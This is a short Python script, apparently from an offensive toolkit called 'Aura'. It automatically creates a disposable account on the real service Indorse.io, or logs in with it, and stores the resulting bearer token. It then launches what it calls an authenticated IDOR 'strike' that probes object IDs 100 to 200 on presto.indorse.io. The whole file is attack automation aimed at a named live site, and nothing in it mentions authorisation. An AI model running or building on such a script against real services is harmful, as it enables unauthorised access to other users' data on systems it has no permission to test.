import asyncio
import uuid
from aura_auth_bot import IndorseAuthHandler
from indorse_authenticated_idor import test_indorse_idor
from aura.ui.formatter import console

async def run_auto_strike():
    handler = IndorseAuthHandler()
    
    # Generate unique credentials
    uid = str(uuid.uuid4())[:8]
    email = f"aura_bot_{uid}@scavenger.org"
    password = f"P@ssw0rd_{uid}!"
    username = f"aura_{uid}"

    console.print(f"[bold cyan]Aura Full-Auto Strike Initialized: Indorse.io[/bold cyan]")
    
    # 1. Attempt Auto-Registration
    token = await handler.register(email, password, username)
    if not token:
        console.print(f"  [yellow][!] Auto-Registration failed or already existed. Attempting Login...[/yellow]")
        # Try login if registration failed (maybe user already has it)
        token = await handler.login(email, password)

    if token:
        # 2. Run the Authenticated IDOR Prober
        # Now that the token is in the vault (via login) or in memory
        from aura_auth import vault
        vault.set_session("presto.indorse.io", {"Authorization": f"Bearer {token}"})
        
        console.print(f"  [bold green][+] Authenticated! Launching IDOR Strike...[/bold green]")
        await test_indorse_idor(100, 200) # Increased range for the strike
    else:
        console.print(f"  [bold red][!] Full-Auto Strike Failed. Target protection is high.[/bold red]")

if __name__ == "__main__":
    asyncio.run(run_auto_strike())
